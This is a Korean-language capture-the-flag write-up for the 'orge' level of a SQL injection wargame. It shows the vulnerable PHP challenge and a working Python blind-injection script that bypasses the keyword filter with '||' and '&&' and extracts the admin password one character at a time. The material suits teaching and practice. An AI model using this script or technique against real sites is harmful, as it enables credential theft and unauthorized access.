# LOS - orge

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(preg_match('/or|and/i', $_GET[pw])) exit("HeHe"); 
  $query = "select id from prob_orge where id='guest' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
   
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orge where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orge"); 
  highlight_file(__FILE__); 
?>
```

이번 문제는 orc문제와 비슷하게 구성되어 있지만 darkelf 문제의 조건이 추가되어 있다.
그러므로 전에 있던 코드를 알맞게 수정하여 돌리면 답이 나오겠다.

```python
import requests
cooki = {'PHPSESSID': "60n14boast8mdim3p13n5kmij6"}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
i = 1
key = "Hello admin"
pw_len = 0
while True:
    params = {'pw': "'||length(pw)="+str(i)+'#'}
    res = requests.get(url, params, cookies=cooki)
    print res.text
    if key in res.text:
        pw_len = i
        break
    i = i + 1
    print i
print pw_len
for j in range(1,pw_len+1):
    for k in range(48, 123):
        if 58 <= k < 65:
            continue
        if 91 <= k < 97:
            continue
        params = {'pw': "1' || id='admin' && ascii(substr(pw,"+str(j)+",1)) = "+str(hex(k))+"#"}
        res2 = requests.get(url, params, cookies=cooki)

        if key in res2.text:
            print str(j) + " : " + chr(k)

```

orc 코드에서 sessionID와 url 그리고 'or'와'and'를 '||'와 '&&'로 바꿔주는 것만 수정하였다. 

![1565268433557](C:\Users\qkrwl\Documents\web\los\LOS - orge-clear)

